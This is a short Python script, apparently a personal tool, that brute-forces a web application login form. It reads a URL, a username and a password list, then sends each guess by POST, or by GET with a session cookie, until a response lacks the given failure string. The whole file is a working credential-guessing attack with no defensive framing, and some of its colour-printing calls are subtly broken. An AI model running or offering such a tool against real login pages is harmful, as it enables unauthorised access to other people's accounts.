import requests
from termcolor import colored


print("Welcome to c0y0te's Web Application Bruteforcer!")
# Asks for input of what to brute-force.
url = input('[*] Enter Page URL: ')
username = input('[*] Enter Username: ')
password_file = input('[*] Enter Password List To Use (ex. ~/Desktop/passwords.txt): ')
login_failed_string = input('[*] Enter String That Occurs When Login Failed: ')
cookie_value = input('[*] Enter Session Cookie Value (Optional): ')


# Brute-forcing cracking function that tries passwords from list.
def cracking(username, url):
    for password in passwords:
        password = password.strip()
        print('[-] Trying: ' + password)
        # Assign the word that signifies the username, password, and button field as the keys.
        data = {'username': username, 'password': password, 'Login': 'Login'}
        # If there is a cookie value, send a GET request with word assignment for username, password, button, and cookie
        if cookie_value != '':
            response = requests.get(url, params={'username': username, 'password': password, 'Login': 'Login'}, cookies={'Cookie': cookie_value})
        else:
            # Sends a POST request with the username, password, and button for login, stores results.
            response = requests.post(url, data=data)
        # Check response to see if login failed.
        if login_failed_string in response.content.decode():
            pass
        else:
            print(colored('[+] Found Username! ---> ' + username), 'green')
            print(colored('[+] Found Password! ---> ' + password), 'green')
            exit()


# Opens the password list file with read rights and assigns it to 'passwords' object.
with open(password_file, 'r') as passwords:
    cracking(username, url)

print(colored('[!] Password Not Found!'), 'red')
